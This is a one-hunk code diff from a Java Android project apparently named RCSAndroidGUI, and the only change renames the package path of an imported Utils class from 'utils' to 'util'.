@@ -21,7 +21,7 @@ import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.crypto.Crypto;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.event.EventConf;
-import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
